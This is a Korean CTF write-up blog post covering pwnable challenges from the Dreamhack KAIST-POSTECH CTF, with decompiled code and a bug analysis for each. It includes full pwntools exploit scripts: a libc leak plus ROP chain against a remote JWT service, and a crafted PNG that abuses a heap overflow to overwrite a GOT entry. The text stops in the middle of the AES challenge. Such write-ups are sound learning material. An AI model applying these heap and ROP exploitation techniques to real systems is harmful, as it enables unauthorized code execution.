---
title: "Dreamhack Kaist Postech CTF"
description: "Dreamhack KAPO CTF"
dateString: December 2023
draft: false
tags: ["Kaist Postech CTF","KAPO CTF"]
weight: 30
date: 2023-12-20
# cover:
    # image: ""
---

개인전으로 2위를 했다.
2022, 2023 kaist postech ctf 모든 포너블 챌린지를 해결했고 리버싱 챌린지 하나를 해결했다.

# sonofthec
인터넷 검색을 통해 enum을 복구한다.
![blog/Dreamhack_KAIST_POSTECH_CTF_2023/enum.png]

```JavaScript
 	methods_fn[0] = (__int64)exit_with_code;
  methods_fn[1] = (__int64)register;
  methods_fn[2] = (__int64)login;
  methods_fn[3] = (__int64)token_status;
  methods_fn[4] = (__int64)update;
  methods_fn[5] = (__int64)logout;
  result = upload;
  methods_fn[6] = (__int64)upload;
```
json으로 입력을 받고 그에 따른 핸들러를 호출한다.
```JavaScript
  read_secret();
  args = json_object_object_get(json_obj, "args");
  STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, "username");
  chk_string((__int64)STR);
  object.username = json_object_get_string(STR);
  usr_name_len = strlen((const char *)object.username);
  if ( usr_name_len > 0x10 )
    exit(0);
  STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, "email");
  chk_string((__int64)STR);
  object.email = json_object_get_string(STR);
  STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, "Car");
  chk_string((__int64)STR);
  object.Car = json_object_get_string(STR);
  STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, "VIN");
  chk_string((__int64)STR);
  object.Vin = json_object_get_string(STR);
  std::allocator<char>::allocator(vin);
  new_string(vin_1, (char *)object.Vin);
  std::allocator<char>::~allocator();
  std::string::basic_string((__int64)str, (__int64)vin_1);
  check_string_length((__int64)str);
  std::string::~string(str);
  STR = (std::chrono::_V2::system_clock *)json_object_object_get(args, "Company");
  chk_string((__int64)STR);
  object.Company = json_object_get_string(STR);
  v18 = std::chrono::_V2::system_clock::now(STR);
  initialize(                                   // memleak. 0x10 sz username.
    (const char *)object.username,
    (const char *)object.email,
    (const char *)object.Car,
    (const char *)object.Vin,
    (const char *)object.Company);
  initialize_object(vin);
  std::allocator<char>::allocator(v15);
  new_string(dreamhack_string, "Dreamhack");
  v3 = setting_iss((__int64)vin, (__int64)dreamhack_string);
  std::allocator<char>::allocator(&v15[1]);
  new_string(v33, "JWT");
  v4 = setting_typ(v3, (__int64)v33);
  *(_DWORD *)&v16[8] = 30;
  sub_115E4(v19, (int *)&v16[8]);
  v20 = sub_11607((__int64)&v18, (__int64)v19);
  v5 = setting_exp(v4, (__int64)&v20);
  std::allocator<char>::allocator(&v15[2]);
  new_string(usrname, (char *)object.username);
  set_data(&data, (__int64)usrname);
  std::allocator<char>::allocator(&v15[3]);     // allocator doesnt do anything. just a dummy function
  new_string(username_string, "username");
  v6 = sub_117B0(v5, (__int64)username_string, &data);// v31+8 -> string_ptr
  std::allocator<char>::allocator(&v15[4]);
  new_string(a1, (char *)object.email);
```
```JavaScript
if ( username )
  {
    v5 = strlen(username);
    strncpy((char *)ptr, username, v5);
  }
  if ( email )
  {
    l = strlen(email);
    v7 = ptr;
    v7->email = (__int64)malloc(l + 1);
    strcpy((char *)ptr->email, email);
  }
  if ( car )
  {
    l_1 = strlen(car);
    v9 = ptr;
    v9->car = (__int64)malloc(l_1 + 1);
    strcpy((char *)ptr->car, car);
  }
  if ( vin )
  {
    v10 = strlen(vin);
    v11 = ptr;
    v11->vin = (__int64)malloc(v10 + 1);
    strcpy((char *)ptr->vin, vin);
  }
  if ( company )
```
다음과 같이 여러 필드를 받으며, 이에 따라 JWT 토큰을 발급한다.
initialize 함수에서 0x10 size로 검증한다.
null terminated가 제대로 이루어지지 않을 수 있다.
ptr에 저장된 객체가 참조되며 프린트된다면, memory leak이 발생할 수 있다.
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph.png]
Hex-rays 상에선 보이지 않지만, graph view에선 실제로는 c++의 code level exception의 핸들러들도 구현이 되어있다.
만약 exception이 raise되면, exception에 따라 stack unwinding 등의 작업을 수행한다.
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph1.png]
  
```JavaScript
 	v3 = json_object_object_get(obj, "args");
  v4 = json_object_object_get(v3, "token");
  chk_string(v4);
  if ( !v4 )
    exit(-1);
  token = (char *)json_object_get_string(v4);
  if ( !token )
    exit(-1);
  std::allocator<char>::allocator((char *)&v2 + 3);
  new_string(tok, token);
  std::allocator<char>::~allocator();
  std::string::operator=(&current_token, tok);
  sub_F323((__int64)v7, (__int64)tok);
  sub_F40E((__int64)v8, (__int64)v7);
  verify((__int64)v8);                          // exception can be thrown here
  sub_F27A((__int64)v8);
  std::operator<<<std::char_traits<char>>(&std::cout, "Login success\n");
  sub_F27A((__int64)v7);
  std::string::~string(tok);
  return 0LL;
```
jwt token을 입력으로 받아서 로그인을 수행한다.
```JavaScript
  std::allocator<char>::allocator(&v6);
  new_string(v12, "Dreamhack");
  v2 = sub_11DCE(v1, (__int64)v12);
  std::allocator<char>::allocator(&v7);
  new_string(v13, "Dreamhack");
  set_data(&v9, (__int64)v13);
  std::allocator<char>::allocator(v8);
  new_string(v14, "Company");
  v3 = sub_11F76(v2, (__int64)v14, (__int64)&v9);
  verify_0(v3, rdi0);
  std::string::~string(v14);
  std::allocator<char>::~allocator(v8);
  sub_F350(&v9);
  std::string::~string(v13);
  std::allocator<char>::~allocator(&v7);
  std::string::~string(v12);
  std::allocator<char>::~allocator(&v6);
  sub_F370((__int64)v15);
  std::string::~string(a1);
  std::allocator<char>::~allocator(&v5);
  sub_F10A((__int64)v10);
  priv_flag = 1;                                // if Exception Thrown, priv_flag = 0
  return v16 - __readfsqword(0x28u);
}
```
verify 함수에서 priv_flag가 1이 되면 로그인에 성공하게 된다.
이때 JWT 토큰의 Company가 Dreamhack인지를 검증하게 되며, 아니라면 exception이 raise된다.
```JavaScript
v5 = __readfsqword(0x28u);
  sub_9E62((std::_V2 *)&v3);
  sub_15EDC(a1, a2, (std::_V2 *)&v3);
  sub_E470(v3, v4);
  return v5 - __readfsqword(0x28u);
}
```
```JavaScript
  result = sub_9FB6(&v18);
  if ( (_BYTE)result )
  {
    v3 = sub_CF54();
    v4 = sub_9F24(&v18);
    if ( (unsigned __int8)sub_9E44(v4, v3) )
    {
      exception = __cxa_allocate_exception(0x20uLL);
      sub_E2FE(exception, (unsigned int)v18, v19);
      __cxa_throw(exception, (struct type_info *)&typeinfo for'jwt::error::rsa_exception, sub_26EFC);
    }
    v6 = sub_D346();
    v7 = sub_9F24(&v18);
    if ( (unsigned __int8)sub_9E44(v7, v6) )
    {
      v8 = __cxa_allocate_exception(0x20uLL);
      sub_E348(v8, (unsigned int)v18, v19);
      __cxa_throw(v8, (struct type_info *)&`typeinfo for'jwt::error::ecdsa_exception, sub_26E9E);
    }
    v9 = sub_D78D();
    v10 = sub_9F24(&v18);
    if ( (unsigned __int8)sub_9E44(v10, v9) )
    {
      v11 = __cxa_allocate_exception(0x20uLL);
      sub_E392(v11, (unsigned int)v18, v19);
      __cxa_throw(v11, (struct type_info *)&typeinfo for'jwt::error::signature_verification_exception, sub_26FB8);
    }
    v12 = sub_DE33();
    v13 = sub_9F24(&v18);
    if ( (unsigned __int8)sub_9E44(v13, v12) )
    {
      v14 = __cxa_allocate_exception(0x20uLL);
      sub_E3DC(v14, (unsigned int)v18, v19);
      __cxa_throw(v14, (struct type_info *)&typeinfo for'jwt::error::signature_generation_exception, sub_26F5A);
    }
    v15 = sub_E231();
    v16 = sub_9F24(&v18);
    result = sub_9E44(v16, v15);
    if ( (_BYTE)result )
    {
      v17 = __cxa_allocate_exception(0x20uLL);
      sub_E426(v17, (unsigned int)v18, v19);
      __cxa_throw(v17, (struct type_info *)&typeinfo for'jwt::error::token_verification_exception, sub_26E40);
    }
  }
  return result;
}
```
이때도 hex-rays 상에 보이지 않는 핸들러가 존재한다.
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph2.png]
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph3.png]
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph4.png]
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph5.png]
이때 priv_flag에 0이 대입된다.
token status에서 jwt 토큰을 받고, 그 토큰에 대한 정보를 출력한다.
```JavaScript
    new_string(v15, "Company");
    v2 = sub_11F76(v1, (__int64)v15, &v10);
    verify_0(v2, (__int64)v17);
    std::string::~string(v15);
    std::allocator<char>::~allocator();
    sub_F350(&v10);
    std::string::~string(v14);
    std::allocator<char>::~allocator();
    std::string::~string(v13);
    std::allocator<char>::~allocator();
    sub_F370((__int64)v16);
    std::string::~string(a1);
    std::allocator<char>::~allocator();
    sub_F10A((__int64)v11);
    sub_120B8(v11, v17);
    v8 = v11;
    *(_QWORD *)&v7[3] = sub_12184((__int64)v11);
    *(_QWORD *)&v10.type = sub_121A2(v8);
    while ( !sub_121C0(&v7[3], &v10) )
    {
      v9 = (char *)sub_12208(&v7[3]);
      v3 = std::operator<<<char>(&std::cout, v9);
      v4 = std::operator<<<std::char_traits<char>>(v3, " = ");
      v5 = sub_1222D(v4, (data *)v9 + 2);
      std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
      sub_121E6((__int64)&v7[3]);
    }
    sub_F608((__int64)v11);
    sub_F27A((__int64)v17);
```
이때 문제는 memory leak은 파싱된 jwt의 body를 기준으로 출력하며, 내부적으로 key, value 형태의 오브젝트로 구현된다.
register시에 initialize되어 null terminated string이 아니라, 파싱된 스트링을 jwt 토큰 제작에 이용하므로 memory leak이 절대 불가능하다.
하지만 Exception이 발생했을때 복구 로직에 구현 오류가 존재한다.
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph6.png]
exception 복구 로직은 진한 초록색으로 하이라이팅되어있는 부분이다.
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph7.png]
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/graph8.png]
이때 ptr이 참조되면서 복구 로직이 수행된다.
구현이 가용성에 초점이 맞춰져있어서 exception이 thrown되어도 정상처리를 가능케 해준다.
이를 악용하기 위해서는 JWT 토큰을 검증 시각에 invalidate하게 만들 필요가 있다.
```JavaScript
  clock = std::chrono::_V2::system_clock::now(STR);
  ...
  new_string(v33, "JWT");
  v4 = setting_typ(v3, (__int64)v33);
  *(_DWORD *)&v16[8] = 30;
  sub_115E4(v19, (int *)&v16[8]);
  v20 = sub_11607((__int64)&clock, (__int64)v19);
	v5 = setting_exp(v4, (__int64)&v20);
```
```JavaScript
 	v4 = *a1;
  v2 = ret_a1_1(&v4);
  copy_obj(v5, a2);
  v6 = v2 + ret_a1_1(v5);
  set_result(v7, &v6);
  return v7[0];
```
마침 expire time이 30초이므로 그 시간을 sleep하고 token을 검증하면 invalidate 시킬 수 있고, 복구 로직에 의해서 memory가 leak된다.
```JavaScript
  v5 = json_object_object_get(a1, "args");
  v6 = json_object_object_get(v5, "idx");
  if ( !v6 )
    exit(-1);
  data = json_object_object_get(v5, "data");
  v3 = ((__int64 (__fastcall *)(__int64))json_object_array_length)(v6);
  data_len = ((__int64 (__fastcall *)(__int64))json_object_array_length)(data);
  if ( v3 > 0x10 )
    exit(-1);
  for ( i = 0; data_len > i; ++i )
  {
    idx = json_object_array_get_idx(data, (int)i);
    if ( (unsigned int)((__int64 (__fastcall *)())json_object_get_type)() == json_type_int )
      v9[i] = json_object_get_int64(idx);
  }
```
bof가 있으니 rip control도 가능하다.
canary는 int가 아닐때 write가 안되니 우회할 수 있다.
## Exploit
```JavaScript
from pwn import *
import json
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
rvu = lambda x : p.recvuntil(x)
sl = lambda x : p.sendline(x)
rvl = lambda : p.recvline()
def dump(object):
    ret = b'{'
    l = len(object.keys())
    i = 0
    for it in object.keys():
        if isinstance(object[it],dict):
            ret += b'"'
            if isinstance(it, bytes):
                ret += it
            elif isinstance(it, str):
                ret += it.encode()
            else: 
                raise Exception('unsupported type')
            ret += b'" : '
            ret += dump(object[it])
        elif isinstance(object[it],bytes) or isinstance(object[it],str):
            ret += b'"'
            if not isinstance(it, bytes):
                ret += it.encode()
            elif isinstance(it, str):
                ret += it
            else:
                raise Exception('unsupported type')
            ret +=  b'" : "'
            if isinstance(object[it],bytes):
                ret += object[it]
            else:
                ret += object[it].encode()
            ret += b'"'
        elif isinstance(object[it],int):
            ret += b'"'
            if not isinstance(it, bytes):
                ret += it.encode()
            elif isinstance(it, str):
                ret += it
            else:
                raise Exception('unsupported type')
            ret += b'" : "' + str(object[it]).encode() + b'"'
        elif isinstance(object[it],list):   
            ret += b'"'
            if not isinstance(it, bytes):
                ret += it.encode()
            elif isinstance(it, str):
                ret += it
            else:
                raise Exception('unsupported type')
            
            val = b'['
            for k in object[it]:
                if isinstance(k, int):
                    val += str(k).encode() + b','
                elif isinstance(k, str):
                    val += b'"' + k.encode() + b'",'
                else:
                    raise Exception('unsupported type')
            val = val[:-1]
            val += b']'
            ret += b'" : ' + val 
        else:
            raise Exception('unsupported type')
        i += 1
        if i != l:
            ret += b',' 
    ret += b'}'
    return ret
def register(username, email, car, vin, company):
    a = {
        'header':{
            'method':'register'
        },
        'args':{
            'username':username,
            'email':email,
            'Car':car,
            'VIN':vin,
            'Company':company,
        },
    }
    # max vin 0x11,username 0x10
    payload = dump(a)
    return payload
def login(token):
    a = {
        'header':{
            'method':'login'
        },
        'args' : {
            'token' : token
        } 
    }
    payload = dump(a)
    return payload
def token_status():
    a = {
        'header':{
            'method':'token_status'
        },
    }
    payload = dump(a)
    return payload
def play(): 
    a = {
        'header':{
            'method':'play'
        },
    }
    payload = dump(a)
    return payload
def logout(token):
    a = {
        'header':{
            'method':'logout'
        },
        'args':{
            'token' : token
        }
    }
    payload = dump(a)
    return payload
def update():
    a = {
        'header':{
            'method':'logout'
        },
        'args':{
            'token' : token
        }
    }
    payload = dump(a)
    return payload
def upload(data : list):
    a = {
        'header':{
            'method':'upload'
        },
        'args':{
            'idx':[1,2,3],
            'data': data
        }
    }
    payload = dump(a)
    return payload
    

if __name__ == '__main__':
    # p = process('./sonofthec',env={'LD_PRELOAD':'./libc.so.6'})
    p = remote('host3.dreamhack.games',8303)
    payload = register(b'A'*0x10,b'asdf',b'morning',b'A'*0x11,b'Dreamhack')
    # if company is not Dreamhack exception raised.
    print(payload)
    # pause()
    sl(payload)
    rv = json.loads(rvl()[:-1])
    tok = rv['token']
    payload = register(b'A'*0x10,b'asdf',b'morning',b'A'*0x11,b'Dreamhack')
    sl(payload)
    rv = json.loads(rvl()[:-1])
    tok = rv['token']
    payload = register(b'A'*0x8,b'asdf',b'morning',b'A'*0x11,b'Dreamhack')
    sl(payload)
    rv = json.loads(rvl()[:-1])
    tok = rv['token']
    payload = login(tok)
    print(payload)
    sl(payload)
    \#leak
    success("sleeping 30s")
    sleep(30)
    success('now token is expired memleak.')
    payload = token_status()
    context.log_level='debug'
    sl(payload)
    rvu(b'A'*8)
    libc_base = u64(rvl()[:-1].ljust(8,b'\x00')) - 0x219df0
    success(hex(libc_base))
    # exp time = 30sec, so exception will be raised after 30s 
    # if exception is thrown while proccessing JWT token validation, it traps and use ptr, a global variable to print things out so that they can print out some memory.
    # because this program frequently allocates mem and free, there's freed chunk in unsorted bin, once i reclaim it, i can get libc_base.
    payload = [1]*0x11 + ["1"] + [1]+ [libc_base + 0x000000000002a3e5, libc_base + 0x1d8698, libc_base + 0x0000000000029cd6,libc_base + 0x000000000050d60] 
    payload = upload(payload)
    print(payload)
    pause() 
    sl(payload)
    p.interactive()
# 0000C139	.plt.sec:___cxa_throw+4	bnd jmp cs:__cxa_throw_ptr	RAX=000055EBCC696A48 RDX=000055EBCC683FB8 RSI=000055EBCC696A48 RDI=000055EBCDE23EE0
# KAPO{js0n_C_w1th_jwt_t0ken_hs_256}
```
# online stego
```JavaScript
@app.route('/encode', methods=['POST'])
def post_encode():
    if 'png' not in request.files:
        abort(400)
    if 'msg' not in request.form:
        abort(400)
    png = request.files['png']
    msg = request.form['msg']
    if not validate_extension(png.filename):
        abort(400)
    filename = os.urandom(32).hex() + '.png'
    png.save(os.path.join(app.config['UPLOAD_DIR'], filename))
    result = subprocess.check_output([STEGO_PATH,
                                      '-e',
                                      '-f',
                                      app.config['UPLOAD_DIR'] + '/' + filename,
                                      '-m',
                                      msg])
    return render_template('encode_result.html', href=f'{result.decode()}')

@app.route('/uploads/<path:filename>', methods=['GET'])
def get_uploads(filename):
    return send_from_directory(UPLOAD_DIR, filename)

@app.route('/decode', methods=['GET'])
def get_decode():
    return render_template('decode.html')

@app.route('/decode', methods=['POST'])
def post_decode():
    if 'png' not in request.files:
        abort(400)
    png = request.files['png']
    if not validate_extension(png.filename):
        abort(400)
    filename = os.urandom(32).hex() + '.png'
    png.save(os.path.join(app.config['UPLOAD_DIR'], filename))
    result = subprocess.check_output([STEGO_PATH,
                                      '-d',
                                      '-f',
                                      app.config['UPLOAD_DIR'] + '/' + filename])
    return render_template('decode_result.html', msg=f'{result.decode()}')
```
그냥 바이너리를 실행해서 출력한다.
```JavaScript
#!/bin/bash
sysctl kernel.randomize_va_space=0
su chall -c "export LC_ALL=C.UTF-8; export LANG=C.UTF-8; /bin/sh -c 'while true; do flask run -h 0.0.0.0 ; done'"
```
aslr이 꺼져있다.
```JavaScript
if ( de_flag != 2 )
  {
    if ( de_flag == 1 )
      decode(filename);
    fwrite("Error: Please specify either -d(decoding mode) or -e(encoding mode) option.\n", 1uLL, 0x4CuLL, stderr);
    exit(1);
  }
  encode(filename, message_content);
  return 0LL;
```
png의 청크를 파싱하고, 메세지를 숨기거나 해독할 수 있다.
```JavaScript
  stream = fopen(filename, "r");
  ...
  v8 = fread(sig, 1uLL, 8uLL, stream);
	...
  ihdr = parse_chunk(stream);
  if ( memcmp(&ihdr->type, "IHDR", 4uLL) )
  {
    fwrite("Error: chunk type mismatched\n", 1uLL, 0x1DuLL, stderr);
    exit(1);
  }
  master_node = set_node((__int64)ihdr);
  do
  {
    ihdr = parse_chunk(stream);
    v5 = set_node((__int64)ihdr);
    set_link(master_node, v5);                  // circular doubly linked
  }
  while ( memcmp(&ihdr->type, "IEND", 4uLL) );  // scan while IEND
  v4 = ftell(stream);
  fseek(stream, 0LL, 2);
  v1 = ftell(stream);
  if ( v4 != v1 )
  {
    fwrite("Error: wrong footer\n", 1uLL, 0x14uLL, stderr);
    exit(1);
```
다음과 같이 청크를 파싱한다.
parsechunk 함수는 다음과 같다.
```JavaScript
  v8 = (chunk *)malloc(0x20uLL);
  read = fread(&sz, 1uLL, 4uLL, a1);
  ...
  sz = conv_big2little(sz);
  read = fread(&tpye, 1uLL, 4uLL, a1);
	...
  mem = malloc((unsigned __int16)sz);
  if ( !mem )
  {
    fwrite("Error: malloc()\n", 1uLL, 0x10uLL, stderr);
    exit(1);
  }
  read = fread(mem, 1uLL, sz, a1);
  ...
  read = fread(&crc, 1uLL, 4uLL, a1);
  if ( read <= 3 )
  {
    fwrite("Error: fread()\n", 1uLL, 0xFuLL, stderr);
    exit(1);
  }
  crc = conv_big2little(crc);
  v5 = crc32(0xFFFFFFFF, (__int64)&tpye, 4u);
  v5 = ~(unsigned int)crc32(v5, (__int64)mem, sz);
  if ( v5 != crc )
  {
    fwrite("Error: crc mismatched\n", 1uLL, 0x16uLL, stderr);
    exit(1);
  }
  v8->length = sz;
  v8->type = tpye;
  v8->payload = (__int64)mem;
  v8->crc = crc;
  return v8;
```
heap overflow가 발생한다.
```JavaScript
node *__fastcall set_link(node *master_node, node *new_node)
{
  node *result; // rax
  node *fd; // [rsp+18h] [rbp-8h]
  fd = master_node->fd;
  fd->bk = new_node;
  master_node->fd = new_node;
  new_node->bk = master_node;
  result = new_node;
  new_node->fd = fd;
  return result;
}
```
이런식으로 circular doubly linked list로 연결되어있다.
```JavaScript
for ( master_node = (node *)parse(a1); ; pop(master_node) )
  {
    node = get_current_node(master_node);
    l_ptr = (uint *)&node->length;
    if ( !memcmp(&node->type, "iTXt", 4uLL) && !memcmp(&node->payload->hdr, secret_hdr, 4uLL) )
      break;
  }
  if ( *l_ptr <= 8 )
  {
    fwrite("Error: unable to decode\n", 1uLL, 0x18uLL, stderr);
    exit(1);
  }
  secret_msg_length = *l_ptr - 8;
  p_secret_msg = &node->payload->secret_msg;
  malloc(2 * (__int16)*l_ptr);                  // sign extension
  if ( v2 )                                     // uninitiaized stack var
```
iTXt에 메세지를 암호화하고, decode는 iTXt에서 메세지를 해독한다.
```JavaScript
 	prev = master_node->fd;
  cur = master_node->fd->fd;                    // real current node
  next = cur->fd;
  next->bk = master_node->fd;
  prev->fd = next;
  free(cur->payload);
  free(cur);
```
노드를 unlink하는데, 약간 이상하다. masternode→fd→fd로 돌게된다.
```JavaScript
for ( master_node = (node *)parse(a1); ; pop(master_node) )
  {
    node = get_current_node(master_node);
    l_ptr = (uint *)&node->length;
    if ( !memcmp(&node->type, "iTXt", 4uLL) && !memcmp(&node->payload->hdr, secret_hdr, 4uLL) )
      break;
  }
```
루프를 돌면서 로직 버그가 발생하며, free되면서 chunk_payload + 0x0에는 next freed 청크가 들어가기 때문에, 유저가 다음 노드를 조작할 수 있게 된다.
노드가 적다면, DFB를 트리거할 수 있지만, glibc 2.27의 검증 때문에 불가하다.
노드를 너무 늘리면 결국 singly linked list 형태로 bin에 쌓여서 NULL로 끝나게 되고, 순회하기 충분치 않아 null pointer dereference가 발생하여 DOS로 끝난다.
```JavaScript
  malloc(2 * (__int16)*l_ptr);                  // sign extension
  if ( v2 )                                     // uninitiaized stack var
    s = (sec_msg_hdr *)v2;
  else
    s = node->payload;
  r = (char *)malloc(4uLL);
  if ( !r )
  {
    fwrite("Error: malloc()\n", 1uLL, 0x10uLL, stderr);
    exit(1);
  }
  *(_DWORD *)r = *(_DWORD *)node->payload;
  recover(s->msg, r, (char *)p_secret_msg, secret_msg_length);
```
이후 해독을 진행한다.
## Exploit
```JavaScript
from pwn import *
def calc_crc(chunk:bytes) -> int:
    sz = u32(chunk[:4],endian='big')
    def crc(init : int , asdf : bytes, l : int):
        v3 = 0
        for i in range(l):
            init ^= asdf[i]
            for j in range(8):
                if (init & 1):
                    v3 = 0xEDB88320
                else:
                    v3 = 0
                init = (init>>1) ^ v3
        return init
    v5 = crc(0xffffffff, chunk[4:8], 4)
    v5 = ~(crc(v5, chunk[8:],sz))
    return v5

def gen_chunk(data_length, type : bytes, data : bytes):
    payload = b''
    payload += p32(data_length,endian='big')
    payload += type
    payload += data
    crc = calc_crc(payload) & 0xffffffff
    payload += p32(crc,endian='big')
    return payload
            
# (a1 >> 8) & 0xFF00 | (a1 << 8) & 0xFF0000 | (a1 << 24) | HIBYTE(a1);
# a1[2]>>8 | a[1]<<8 | a1[0] << 24 | a[3] >> 24
# because chunks are linked as a circular doubly linked list, with enough freed chunks u can trigger DFB
# glibc 2.27 has tcache->key validation. no dfb
# masternode -> node3 -> node2 -> node1 
# masternode -> fd -> fd       == current node
# masternode -> fd             == prev node
# masternode -> fd -> fd -> fd == next node
# unlink , pop
# matsernode -> fd -> fd -> fd -> bk = masternode -> fd
# masternode -> fd -> fd = masternode -> fd -> fd -> fd
# free payload
# free node
# trigger1
# payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
# payload += gen_chunk(0x20, b'IHDR', b'A'*0x20)
# chunk = b''
# chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3
# chunk += p32(0)
# chunk += p32(0x378)
# chunk += b'iTXt'
# chunk += b'A'*(0x28 - len(chunk))
# chunk += p64(0x7fffffffd7fc-4)
# payload += gen_chunk(0x30, b'NOD2', chunk)
# payload += gen_chunk(0x30, b'NOD1', bytes([0xCA, 0xFE, 0xCA, 0xFE])*2*2*3)
# payload += gen_chunk(0x30, b'IEND', p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b'B'*0x10)

# trigger2 heapoverflow
payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A])
pay = b''
pay += b'A'*(0xf8-len(pay))
pay += p64(0xffffffffffffffff)
pay += b'B'*(0x100f8-len(pay))
payload += gen_chunk(0x100f8,b'IHDR',pay)
chunk = b''
chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3
chunk += p32(0)
chunk += p32(0xffffec58+0x10-0x20) # size
chunk += b'iTXt'
chunk += p32(0x400CC7)
chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE]) # hdr for payload ptr
chunk += b'C'*(0x28 - len(chunk))
chunk += p64(0x6045bc) # payload ptr
payload += gen_chunk(0x30, b'NOD2', chunk)
payload += gen_chunk(0x30, b'NOD1', b'A'*0x30)
payload += gen_chunk(0x30, b'IEND', p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b'B'*0x10)
# payload -> asdf ptr
with open('./exploit.png','wb') as f:
    f.write(payload)
# 0x400CC7 -> read flag
# 0x13e4
```
```JavaScript
      victim = av->top;
      size = chunksize (victim);
      if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
        {
          remainder_size = size - nb;
          remainder = chunk_at_offset (victim, nb);
          av->top = remainder;
          set_head (victim, nb | PREV_INUSE |
                    (av != &main_arena ? NON_MAIN_ARENA : 0));
          set_head (remainder, remainder_size | PREV_INUSE);
          check_malloced_chunk (av, victim, nb);
          void *p = chunk2mem (victim);
          alloc_perturb (p, bytes);
          return p;
        }
      /* When we are using atomic ops to free fast chunks we can get
         here for all block sizes.  */
      else if (atomic_load_relaxed (&av->have_fastchunks))
        {
          malloc_consolidate (av);
          /* restore original bin index */
          if (in_smallbin_range (nb))
            idx = smallbin_index (nb);
          else
            idx = largebin_index (nb);
        }
```
glibc 2.27 소스를 확인해보면 chunk_at_offset에서 victim + nb를 하게 된다.
heap overflow로 size를 덮어서 검증을 우회하고, 0xffff까지의 입력을 넣을 수 있으니 sign extension이 발생하며 이를 이용해서 top chunk로 부터의 상대 주소로 접근할 수 있게된다.
0xffff의 입력은 page 단위로 올라가기 충분하며, got에 접근할 수 있다.
그걸 이용해 exit got를 덮는다.
# Aespropective
```JavaScript
  	print_menu();
    std::istream::operator>>((int64_t)&std::cin, (int64_t)sel);
    switch ( sel[0] )
    {
      case 1:
        create_AES_obj();
        break;
      case 2:
        remove_AES_obj();
        break;
      case 3:
        set_plain_cipher_txt();
        break;
      case 4:
        enc();
        break;
      case 5:
        dec(&std::cin, sel);                    // useless, not implemented yet
        break;
      default:
        continue;
    }
  }
}                                               // UAF leads to memory leak
```
```JavaScript
std::operator<<<std::char_traits<char>>((int64_t)&std::cout, (int64_t)"Enter key size: ");
    std::istream::operator>>((int64_t)&std::cin, (int64_t)&keysz);
    switch ( keysz )
    {
      case 128u:
        v1 = (AES_obj *)operator new(0x28uLL);
        init_AES_128(v1);
        aes_obj_ptr = v1;
        break;
      case 192u:
        v2 = (__int64 *)operator new(0x28uLL);
        init_AES_192(v2);
        aes_obj_ptr = (AES_obj *)v2;
        break;
      case 256u:
        v3 = (__int64 *)operator new(0x28uLL);
        init_AES_256(v3);
        aes_obj_ptr = (AES_obj *)v3;
        break;
      default:
        v4 = std::operator<<<std::char_traits<char>>((int64_t)&std::cout, (int64_t)"No way");
        ((void (__fastcall *)(__int64, void *))std::ostream::operator<<)(v4, &std::endl<char,std::char_traits<char>>);
        exit(0);
    }
    keysz >>= 3;
    key_content = (void *)operator new[](keysz);
    set_cipher_key(key_content, keysz);
    key_schedule(aes_obj_ptr, (char *)key_content);// AES256 OoB. Key corrupted.
    v5 = std::operator<<<std::char_traits<char>>(
           (int64_t)&std::cout,
           (int64_t)"This is sha256 for the encryption key: ");
    ((void (__fastcall *)(__int64, void *))std::ostream::operator<<)(v5, &std::endl<char,std::char_traits<char>>);
    sha256((__int64)hashed_output, aes_obj_ptr);
    v6 = std::operator<<<char>(&std::cout, hashed_output);
```
키 사이즈에 따른 aes 객체들이 구현되어있다.
![/blog/Dreamhack_KAIST_POSTECH_CTF_2023/vtables.png]
리버싱한 결과, AES ECB임이 확인되었다.
그리고 따로 처음에 키 스케쥴링 로직도 확인되었다.
```JavaScript
v6 = __readfsqword(0x28u);
  obj->cipher_and_round_keys = (char *)operator new[](0xB0uLL);
  *(_DWORD *)key_back = 0;
  *(_DWORD *)rcon = 0;
  for ( i = 0; i <= 15; ++i )
    obj->cipher_and_round_keys[i] = obj->key_content[i];
  for ( j = 16; j <= 0xAF; j += 4 )
  {
    key_back[0] = obj->cipher_and_round_keys[j - 4];
    key_back[1] = obj->cipher_and_round_keys[j - 3];
    key_back[2] = obj->cipher_and_round_keys[j - 2];
    key_back[3] = obj->cipher_and_round_keys[j - 1];
    if ( ((j / 4) & 3) == 0 )                   // multiples of 4, means following logics applied at roundkey's first col 
    {
      Rot_word(obj, key_back);                  // shift upwards
      Sub_bytes(obj, (int8_t *)key_back);
      set_rcon(obj, rcon, j / 16);
      add_rcon(obj, (char *)key_back, rcon, (char *)key_back);
    }
    obj->cipher_and_round_keys[j] = key_back[0] ^ obj->cipher_and_round_keys[j - 16];
    obj->cipher_and_round_keys[j + 1] = key_back[1] ^ obj->cipher_and_round_keys[j - 15];
    obj->cipher_and_round_keys[j + 2] = key_back[2] ^ obj->cipher_and_round_keys[j - 14];
    obj->cipher_and_round_keys[j + 3] = key_back[3] ^ obj->cipher_and_round_keys[j - 13];
  }
  return __readfsqword(0x28u) ^ v6;
}                                               // do keyscheduling
```
이런식으로 처음에 round key들을 미리 계산한다.
```JavaScript
unsigned __int64 v6; // [rsp+28h] [rbp-8h]
  v6 = __readfsqword(0x28u);
  a1->cipher_and_round_keys = (char *)operator new[](0xD0uLL);
  v4 = 0;
